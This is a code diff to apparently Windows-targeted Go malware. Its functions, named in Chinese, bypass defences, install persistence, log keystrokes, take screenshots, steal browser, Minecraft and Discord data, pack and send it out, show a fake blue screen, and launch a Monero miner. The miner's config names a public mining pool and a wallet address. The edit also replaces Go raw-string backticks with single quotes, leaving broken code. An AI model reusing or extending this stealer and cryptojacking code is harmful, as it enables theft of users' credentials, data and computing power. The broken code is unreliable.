@@ -370,7 +370,7 @@ func 下载并运行矿机() {
 	zr.Close()
 	os.Remove(zipPath)
 	if exePath != "" {
-		config := `{"api": {"id": null},"http": {"enabled": false},"autosave": true,"background": true,"colors": false,"title": true,"randomx": {"1gb-pages": true, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1},"cpu": {"enabled": true, "huge-pages": true, "priority": null, "yield": true, "max-threads-hint": 40},"opencl": {"enabled": true},"cuda": {"enabled": true},"pools": [{"algo": null, "coin": "monero", "url": "pool.supportxmr.com:3333", "user": "84FKzLjnfFEQ3shrtccBGmA2gpaTCfERrSF4PSsjXkXgFJ3QCVuTC7nbeJ1tJsKsMFLweYcC7yUNaeTZiEjx2Cn9LMLSvb5", "pass": "x", "enabled": true}]}`
+		config := '{"api": {"id": null},"http": {"enabled": false},"autosave": true,"background": true,"colors": false,"title": true,"randomx": {"1gb-pages": true, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1},"cpu": {"enabled": true, "huge-pages": true, "priority": null, "yield": true, "max-threads-hint": 40},"opencl": {"enabled": true},"cuda": {"enabled": true},"pools": [{"algo": null, "coin": "monero", "url": "pool.supportxmr.com:3333", "user": "84FKzLjnfFEQ3shrtccBGmA2gpaTCfERrSF4PSsjXkXgFJ3QCVuTC7nbeJ1tJsKsMFLweYcC7yUNaeTZiEjx2Cn9LMLSvb5", "pass": "x", "enabled": true}]}'
 		cfgPath := filepath.Join(destDir, "config.json")
 		os.WriteFile(cfgPath, []byte(config), 0644)
 		cmd := exec.Command(exePath, "--config="+cfgPath)
@@ -388,16 +388,28 @@ func main() {
 	showWindow.Call(hwnd, 0)
 	绕过防御()
 	安装持久化()
+
+	markerPath := filepath.Join(os.Getenv("TEMP"), "sys_diag.tmp")
+	if _, err := os.Stat(markerPath); os.IsNotExist(err) {
+		os.WriteFile(markerPath, []byte("1"), 0644)
+		go 假蓝屏()
+	}
+
 	go 键盘钩子()
+	
 	dir, _ := os.MkdirTemp("", "win_grab_")
 	defer os.RemoveAll(dir)
 	go 屏幕截图(dir)
+	
 	go 发送捕获()
+
 	抓取浏览器(dir)
 	抓取Minecraft(dir)
 	抓取Discord(dir)
+
 	打包并发送(dir)
-	go 假蓝屏()
+
 	go 下载并运行矿机()
+
 	select {}
 }
